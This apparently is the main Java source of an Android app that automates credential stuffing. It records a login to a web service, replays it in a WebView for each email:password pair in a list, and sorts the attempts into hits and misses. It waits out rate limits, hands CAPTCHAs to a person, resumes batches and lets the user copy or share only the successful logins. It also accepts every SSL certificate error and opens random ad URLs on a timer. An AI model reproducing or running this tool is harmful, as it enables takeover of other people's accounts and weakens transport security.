package com.dtech.automation;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.http.SslError;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.SslErrorHandler;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class MainActivity extends Activity implements ServiceSelectionManager.OnServiceSelectedListener {

    private static final String TAG = "WebAutomation";
    private WebView mWebView;
    private TextView txtServiceName;
    private Button btnRecord, btnStop, btnPlay, btnStopBatch, btnSettings, btnResults, btnInfo, btnAdSystem, btnChangeService;

    // --- Recording State Machine ---
    private static final int RECORD_MODE_NONE = 0;
    private static final int RECORD_MODE_SUCCESS = 1;
    private static final int RECORD_MODE_FAILURE = 2;
    private int recordingMode = RECORD_MODE_NONE;

    private boolean isReplaying = false;
    private long recordingStartTime = 0;
    private long replayStartTime = 0;
    private int lastExecutedIndex = -1;

    // Current Service
    private ServiceRepository serviceRepo;
    private ServiceRepository.ServiceData currentService;

    // Batch Execution State
    private List<String> credentialList = new ArrayList<>();
    private int currentCredentialIndex = 0;
    private boolean isBatchRunning = false;
    private int verificationAttempts = 0;
    private static final int MAX_VERIFICATION_ATTEMPTS = 20;

    private List<JSONObject> currentSessionEvents = Collections.synchronizedList(new ArrayList<>());

    // Handlers
    private android.os.Handler batchHandler = new android.os.Handler();
    private Runnable verificationRunnable;
    private Runnable nextCredentialRunnable;

    // Auto Ad
    private android.os.Handler adCheckHandler = new android.os.Handler();
    private Runnable adCheckRunnable;

    private static final String PREFS_NAME = "AutomationPrefs";
    private static final String KEY_BATCH_INDEX = "batch_current_index";

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mWebView = findViewById(R.id.activity_main_webview);
        txtServiceName = findViewById(R.id.txt_service_name);
        btnRecord = findViewById(R.id.btn_record);
        btnStop = findViewById(R.id.btn_stop);
        btnPlay = findViewById(R.id.btn_play);
        btnStopBatch = findViewById(R.id.btn_stop_batch);
        btnSettings = findViewById(R.id.btn_settings);
        btnResults = findViewById(R.id.btn_results);
        btnInfo = findViewById(R.id.btn_info);
        btnAdSystem = findViewById(R.id.btn_ad_system);
        btnChangeService = findViewById(R.id.btn_change_service);

        serviceRepo = new ServiceRepository(this);
        setupWebView();
        setupButtons();

        loadLastService();
        startAdChecker();
    }

    private void loadLastService() {
        String lastId = serviceRepo.getLastUsedServiceId();
        if (lastId != null) {
            ServiceRepository.ServiceData s = serviceRepo.getServiceById(lastId);
            if (s != null) {
                onServiceSelected(s);
            } else {
                showServiceSelection();
            }
        } else {
            showServiceSelection();
        }
    }

    private void showServiceSelection() {
        new ServiceSelectionManager(this, this).showServiceSelectionDialog();
    }

    @Override
    public void onServiceSelected(ServiceRepository.ServiceData service) {
        this.currentService = service;
        txtServiceName.setText("Service: " + service.getName());

        // Load Script
        try {
            JSONArray arr = new JSONArray(service.getScriptJson());
            currentSessionEvents.clear();
            for(int i=0; i<arr.length(); i++) currentSessionEvents.add(arr.getJSONObject(i));
        } catch (JSONException e) {
            currentSessionEvents.clear();
        }

        if (isConnected()) {
            mWebView.loadUrl(service.getLoginUrl());
        } else {
            showOfflineDialog();
        }
    }

    private void setupWebView() {
        WebSettings webSettings = mWebView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowContentAccess(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setDatabaseEnabled(true);

        mWebView.addJavascriptInterface(new WebAppInterface(this), "Android");

        mWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed();
            }
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) { return false; }
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) { return false; }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                if (recordingMode != RECORD_MODE_NONE) {
                    injectRecorder();
                } else if (isReplaying) {
                     if (isBatchRunning) {
                         // Only inject replayer if we are on or redirected from the login page
                         // For now, we simply wait a bit and inject
                         mWebView.postDelayed(() -> injectReplayer(), 1500);
                     } else {
                         injectReplayer();
                     }
                }
            }
        });
    }

    private void setupButtons() {
        // Admin controls are now public but only visible when relevant
        btnStop.setVisibility(android.view.View.GONE);
        btnStopBatch.setVisibility(android.view.View.GONE);

        btnRecord.setOnClickListener(v -> startRecordingPhase1());
        btnStop.setOnClickListener(v -> stopRecording());
        btnPlay.setOnClickListener(v -> startBatchReplay());
        btnStopBatch.setOnClickListener(v -> stopBatch());
        btnSettings.setOnClickListener(v -> startActivity(new android.content.Intent(this, SettingsActivity.class)));
        btnResults.setOnClickListener(v -> showBatchResults());
        btnChangeService.setOnClickListener(v -> showServiceSelection());

        btnInfo.setOnClickListener(v -> startActivity(new android.content.Intent(this, InfoActivity.class)));
        btnAdSystem.setOnClickListener(v -> startActivity(new android.content.Intent(this, AdSystemActivity.class)));
    }

    // --- Recording Logic ---

    private void startRecordingPhase1() {
        if (currentService == null) {
            Toast.makeText(this, "Select a service first", Toast.LENGTH_SHORT).show();
            return;
        }

        new AlertDialog.Builder(this)
            .setTitle("Step 1: Success Recording")
            .setMessage("Please log in with VALID credentials.\n\nClick STOP when you reach the dashboard/success page.")
            .setPositiveButton("Start", (d, w) -> {
                // Reset session
                currentSessionEvents.clear();
                recordingStartTime = System.currentTimeMillis();
                recordingMode = RECORD_MODE_SUCCESS;

                // Reset UI
                btnRecord.setVisibility(android.view.View.GONE);
                btnStop.setVisibility(android.view.View.VISIBLE);
                btnPlay.setVisibility(android.view.View.GONE);

                mWebView.loadUrl(currentService.getLoginUrl());
            })
            .setNegativeButton("Cancel", null)
            .show();
    }

    private void startRecordingPhase2() {
        new AlertDialog.Builder(this)
            .setTitle("Step 2: Failure Recording")
            .setMessage("Now, log in with INVALID credentials.\n\nClick STOP when you see the error message.")
            .setPositiveButton("Start", (d, w) -> {
                recordingStartTime = System.currentTimeMillis(); // Reset timer? Or keep? Doesn't matter for failure check.
                recordingMode = RECORD_MODE_FAILURE;

                btnRecord.setVisibility(android.view.View.GONE);
                btnStop.setVisibility(android.view.View.VISIBLE);
                btnPlay.setVisibility(android.view.View.GONE);

                // Clear state and reload
                 android.webkit.CookieManager.getInstance().removeAllCookies(null);
                 android.webkit.WebStorage.getInstance().deleteAllData();
                 mWebView.clearCache(true);
                 mWebView.loadUrl(currentService.getLoginUrl());
            })
            .setCancelable(false)
            .show();
    }

    private void stopRecording() {
        if (recordingMode == RECORD_MODE_NONE) return;

        if (recordingMode == RECORD_MODE_SUCCESS) {
            // Save Success State
            String currentUrl = mWebView.getUrl();
            currentService.setSuccessUrl(currentUrl);

            JSONArray arr = new JSONArray(currentSessionEvents);
            currentService.setScriptJson(arr.toString());

            Toast.makeText(this, "Success Script Saved!", Toast.LENGTH_SHORT).show();

            recordingMode = RECORD_MODE_NONE;
            btnStop.setVisibility(android.view.View.GONE);

            // Trigger Phase 2
            startRecordingPhase2();

        } else if (recordingMode == RECORD_MODE_FAILURE) {
            // Analyze Failure State
            mWebView.evaluateJavascript(
                "(function(){ return document.body.innerText.toLowerCase(); })();",
                value -> {
                    List<String> keywords = new ArrayList<>();
                    if (value != null) {
                        // Simple heuristic: check for common words found in the text
                        String text = value.toLowerCase();
                        if (text.contains("invalid")) keywords.add("invalid");
                        if (text.contains("incorrect")) keywords.add("incorrect");
                        if (text.contains("error")) keywords.add("error");
                        if (text.contains("failed")) keywords.add("failed");
                        if (text.contains("check your")) keywords.add("check your");
                        if (text.contains("try again")) keywords.add("try again");
                    }

                    if (keywords.isEmpty()) {
                        keywords.add("incorrect"); // Default fallback
                        keywords.add("invalid");
                    }

                    currentService.setFailureKeywords(keywords);
                    serviceRepo.addOrUpdateService(currentService);

                    Toast.makeText(this, "Service Setup Complete!", Toast.LENGTH_LONG).show();

                    recordingMode = RECORD_MODE_NONE;
                    btnRecord.setVisibility(android.view.View.VISIBLE);
                    btnStop.setVisibility(android.view.View.GONE);
                    btnPlay.setVisibility(android.view.View.VISIBLE);

                    // Reload clean
                    mWebView.loadUrl(currentService.getLoginUrl());
                });
        }
    }

    // --- Batch Replay Logic ---

    private void startBatchReplay() {
        if (currentService == null || currentSessionEvents.isEmpty()) {
            Toast.makeText(this, "Service not configured. Record first.", Toast.LENGTH_SHORT).show();
            return;
        }

        // Load credentials for THIS service
        SharedPreferences settings = getSharedPreferences(SettingsActivity.PREFS_NAME, MODE_PRIVATE);
        String creds = settings.getString("creds_" + currentService.getId(), "");

        credentialList.clear();
        String[] lines = creds.split("\n");
        for (String line : lines) {
            if (line.contains(":")) credentialList.add(line.trim());
        }

        if (credentialList.isEmpty()) {
            Toast.makeText(this, "No credentials found in Settings for this service.", Toast.LENGTH_SHORT).show();
            return;
        }

        isReplaying = true;
        isBatchRunning = true;

        // Check for resume
        SharedPreferences autoPrefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        int savedIndex = autoPrefs.getInt(KEY_BATCH_INDEX, 0);

        if (savedIndex > 0 && savedIndex < credentialList.size()) {
            new AlertDialog.Builder(this)
                .setTitle("Resume Batch?")
                .setMessage("Resume from Account #" + (savedIndex + 1) + " or Start Over?")
                .setPositiveButton("Resume", (d, w) -> {
                    currentCredentialIndex = savedIndex;
                    startBatchExecution();
                })
                .setNegativeButton("Start Over", (d, w) -> {
                    currentCredentialIndex = 0;
                    startBatchExecution();
                })
                .setCancelable(false)
                .show();
        } else {
            currentCredentialIndex = 0;
            startBatchExecution();
        }
    }

    private void startBatchExecution() {
        btnPlay.setVisibility(android.view.View.GONE);
        btnStopBatch.setVisibility(android.view.View.VISIBLE);
        btnRecord.setVisibility(android.view.View.GONE);

        Toast.makeText(this, "Starting Batch: " + currentService.getName(), Toast.LENGTH_SHORT).show();
        processNextCredential();
    }

    private void stopBatch() {
        isBatchRunning = false;
        isReplaying = false;

        if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);
        if (nextCredentialRunnable != null) batchHandler.removeCallbacks(nextCredentialRunnable);

        btnPlay.setVisibility(android.view.View.VISIBLE);
        btnRecord.setVisibility(android.view.View.VISIBLE);
        btnStopBatch.setVisibility(android.view.View.GONE);

        Toast.makeText(this, "Batch Stopped", Toast.LENGTH_SHORT).show();
    }

    private void processNextCredential() {
        if (!isBatchRunning) return;

        if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);
        if (nextCredentialRunnable != null) batchHandler.removeCallbacks(nextCredentialRunnable);

        if (currentCredentialIndex >= credentialList.size()) {
            getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putInt(KEY_BATCH_INDEX, 0).apply();
            stopBatch();
            runOnUiThread(() -> new AlertDialog.Builder(MainActivity.this)
                .setTitle("Batch Complete")
                .setMessage("Processed all accounts.")
                .setPositiveButton("OK", null)
                .show());
            return;
        }

        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putInt(KEY_BATCH_INDEX, currentCredentialIndex).apply();
        String currentPair = credentialList.get(currentCredentialIndex);
        Log.d(TAG, "Processing: " + currentPair);

        final int targetIndex = currentCredentialIndex;

        android.webkit.CookieManager.getInstance().removeAllCookies(value -> {
            android.webkit.WebStorage.getInstance().deleteAllData();
            mWebView.clearCache(true);

            batchHandler.postDelayed(() -> {
                 if (!isBatchRunning || targetIndex != currentCredentialIndex) return;
                 replayStartTime = System.currentTimeMillis();
                 lastExecutedIndex = -1;
                 mWebView.loadUrl(currentService.getLoginUrl());
            }, 1000);
        });
    }

    private void injectRecorder() {
        String js = readAssetFile("recorder.js");
        String setup = "window.recordingStartTime = " + recordingStartTime + ";";
        mWebView.evaluateJavascript(setup + js, null);
    }

    private void injectReplayer() {
        if (!isReplaying) return;
        String js = readAssetFile("replayer.js");
        verificationAttempts = 0;

        String email = "";
        String pass = "";
        if (isBatchRunning && currentCredentialIndex < credentialList.size()) {
            String[] parts = credentialList.get(currentCredentialIndex).split(":", 2);
            if (parts.length > 0) email = parts[0].trim();
            if (parts.length > 1) pass = parts[1].trim();
        }

        JSONArray jsonArray = new JSONArray(currentSessionEvents);
        JSONObject overrides = new JSONObject();
        try {
            overrides.put("email", email);
            overrides.put("password", pass);
        } catch (JSONException e) {}

        String setup = "window.replayEvents = " + jsonArray.toString() + "; " +
                       "window.replayStartTime = " + replayStartTime + "; " +
                       "window.lastExecutedIndex = " + lastExecutedIndex + "; " +
                       "var overrides = " + overrides.toString() + "; " +
                       "window.overrideEmail = overrides.email; " +
                       "window.overridePassword = overrides.password;";

        mWebView.evaluateJavascript(setup + js, null);

        final int targetIndex = currentCredentialIndex;
        // Start verification
        verificationRunnable = () -> checkVerificationStatus(targetIndex);
        batchHandler.postDelayed(verificationRunnable, 2000);
    }

    private void checkVerificationStatus(int targetIndex) {
        if (!isBatchRunning) return;
        if (targetIndex != currentCredentialIndex) return;

        if (verificationAttempts >= MAX_VERIFICATION_ATTEMPTS) {
            logResult(false, "Timeout", targetIndex);
            moveToNext(targetIndex);
            return;
        }
        verificationAttempts++;

        String js = readAssetFile("verifier.js");

        // Inject Dynamic Configs from ServiceData
        String successUrl = currentService.getSuccessUrl() != null ? currentService.getSuccessUrl() : "";
        List<String> keywords = currentService.getFailureKeywords();
        JSONArray kwJson = new JSONArray();
        if (keywords != null) {
            for(String k : keywords) kwJson.put(k);
        }

        String injection = "window.targetSuccessUrl = '" + successUrl + "'; " +
                           "window.failureKeywords = " + kwJson.toString() + ";";

        mWebView.evaluateJavascript(injection + js, value -> {
            if (!isBatchRunning || targetIndex != currentCredentialIndex) return;

            if (value != null && value.length() > 2) {
                 String jsonStr = value;
                 if (jsonStr.startsWith("\"") && jsonStr.endsWith("\"")) {
                     jsonStr = jsonStr.substring(1, jsonStr.length() - 1).replace("\\\"", "\"");
                 }
                 try {
                     JSONObject res = new JSONObject(jsonStr);
                     String status = res.getString("status");

                     if ("success".equals(status)) {
                         logResult(true, res.optString("detail"), targetIndex);
                         moveToNext(targetIndex);
                     } else if ("failure".equals(status)) {
                         logResult(false, res.optString("detail"), targetIndex);
                         moveToNext(targetIndex);
                     } else if ("rate_limit".equals(status)) {
                         handleRateLimit();
                     } else if ("challenge".equals(status)) {
                         handleChallenge(targetIndex);
                     } else {
                         verificationRunnable = () -> checkVerificationStatus(targetIndex);
                         batchHandler.postDelayed(verificationRunnable, 2000);
                     }
                 } catch (JSONException e) {
                     verificationRunnable = () -> checkVerificationStatus(targetIndex);
                     batchHandler.postDelayed(verificationRunnable, 2000);
                 }
            } else {
                verificationRunnable = () -> checkVerificationStatus(targetIndex);
                batchHandler.postDelayed(verificationRunnable, 2000);
            }
        });
    }

    // --- Common Utilities ---

    private void handleChallenge(int targetIndex) {
        if (targetIndex != currentCredentialIndex) return;
        if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);

        runOnUiThread(() -> {
            new AlertDialog.Builder(this)
                .setTitle("Challenge Detected")
                .setMessage("Please solve the CAPTCHA or Challenge manually.")
                .setCancelable(false)
                .setPositiveButton("I Solved It", (d, w) -> {
                     verificationAttempts = 0;
                     checkVerificationStatus(targetIndex);
                })
                .show();
        });
    }

    private void handleRateLimit() {
        if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);
        runOnUiThread(() -> {
            AlertDialog dialog = new AlertDialog.Builder(this)
                .setTitle("Rate Limit")
                .setMessage("Waiting 5 minutes...")
                .setCancelable(false)
                .setPositiveButton("Continue", (d, w) -> {
                     d.dismiss();
                     processNextCredential();
                })
                .create();
            dialog.show();

            new CountDownTimer(300000, 1000) {
                public void onTick(long millisUntilFinished) {
                    if (dialog.isShowing()) dialog.setMessage("Waiting " + (millisUntilFinished / 1000) + "s...");
                    else cancel();
                }
                public void onFinish() {
                    if (dialog.isShowing()) {
                        dialog.dismiss();
                        if (isBatchRunning) processNextCredential();
                    }
                }
            }.start();
        });
    }

    private void logResult(boolean success, String detail, int index) {
        if (index >= credentialList.size()) return;
        String cred = credentialList.get(index);
        String status = success ? "SUCCESS" : "FAILURE";
        String msg = status + " " + cred + " (powered by DTECH)";
        Log.i(TAG, "Batch Result: " + msg);
        runOnUiThread(() -> Toast.makeText(this, msg, Toast.LENGTH_SHORT).show());
        saveResultToFile(msg);

        if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);
    }

    private void saveResultToFile(String resultLine) {
        try {
            java.io.FileOutputStream fos = openFileOutput("batch_results.txt", MODE_APPEND);
            fos.write((resultLine + "\n").getBytes());
            fos.close();
        } catch (IOException e) { Log.e(TAG, "Save failed", e); }
    }

    private void showBatchResults() {
        try {
            FileInputStream fis = openFileInput("batch_results.txt");
            BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line).append("\n");
            reader.close();

            String res = sb.toString();
            new AlertDialog.Builder(this)
                .setTitle("Batch Results")
                .setMessage(res.length() > 0 ? res : "No results.")
                .setPositiveButton("OK", null)
                .setNegativeButton("Share", (d, w) -> shareResults(res))
                .setNeutralButton("Options", (d, w) -> showResultOptions(res))
                .show();
        } catch (IOException e) { Toast.makeText(this, "No results.", Toast.LENGTH_SHORT).show(); }
    }

    private void showResultOptions(String results) {
        String[] options = {"Copy Success Only", "Clear Results"};
        new AlertDialog.Builder(this).setItems(options, (d, w) -> {
            if (w == 0) copySuccessResults(results);
            else if (w == 1) { deleteFile("batch_results.txt"); Toast.makeText(this, "Cleared", Toast.LENGTH_SHORT).show(); }
        }).show();
    }

    private void copySuccessResults(String full) {
        StringBuilder sb = new StringBuilder();
        for (String line : full.split("\n")) {
            if (line.contains("SUCCESS")) sb.append(line).append("\n");
        }
        if (sb.length() == 0) { Toast.makeText(this, "None", Toast.LENGTH_SHORT).show(); return; }
        android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        cm.setPrimaryClip(android.content.ClipData.newPlainText("Results", sb.toString()));
        Toast.makeText(this, "Copied", Toast.LENGTH_SHORT).show();
    }

    private void shareResults(String res) {
        android.content.Intent i = new android.content.Intent(android.content.Intent.ACTION_SEND);
        i.putExtra(android.content.Intent.EXTRA_TEXT, res);
        i.setType("text/plain");
        startActivity(android.content.Intent.createChooser(i, "Share"));
    }

    private void startAdChecker() {
        adCheckRunnable = new Runnable() {
            public void run() {
                if (System.currentTimeMillis() >= AdManager.getNextAdTime(MainActivity.this)) triggerAutoAd();
                adCheckHandler.postDelayed(this, 30000);
            }
        };
        adCheckHandler.postDelayed(adCheckRunnable, 5000);
    }

    private void triggerAutoAd() {
        AdManager.resetAutoAdTimer(this);
        String url = AdManager.getRandomAdUrl();
        try {
            startActivity(new android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(url)));
        } catch (Exception e) {
            android.content.Intent i = new android.content.Intent(this, AdActivity.class);
            i.putExtra("url", url);
            startActivity(i);
        }
    }

    private void moveToNext(int idx) {
        if (idx != currentCredentialIndex) return;
        currentCredentialIndex++;
        nextCredentialRunnable = this::processNextCredential;
        batchHandler.postDelayed(nextCredentialRunnable, 10000);
    }

    private String readAssetFile(String fileName) {
        try {
            InputStream is = getAssets().open(fileName);
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line).append("\n");
            return sb.toString();
        } catch (IOException e) { return ""; }
    }

    private void showOfflineDialog() {
        new AlertDialog.Builder(this)
            .setTitle("No Internet")
            .setMessage("Check internet connection.")
            .setCancelable(false)
            .setPositiveButton("Exit", (d, w) -> finish())
            .show();
    }

    private boolean isConnected() {
        NetworkInfo ni = ((ConnectivityManager)getSystemService(CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
        return ni != null && ni.isConnected();
    }

    public class WebAppInterface {
        Context mContext;
        WebAppInterface(Context c) { mContext = c; }
        @JavascriptInterface public void showAd(String url) {}
        @JavascriptInterface public void saveSession(String jsonString) {}
        @JavascriptInterface public void recordEvent(String eventJson) {
            try {
                if (recordingMode == RECORD_MODE_SUCCESS) {
                    currentSessionEvents.add(new JSONObject(eventJson));
                }
            } catch (JSONException e) {}
        }
        @JavascriptInterface public void eventExecuted(int index) {
            if (index > lastExecutedIndex) lastExecutedIndex = index;
        }
    }
}
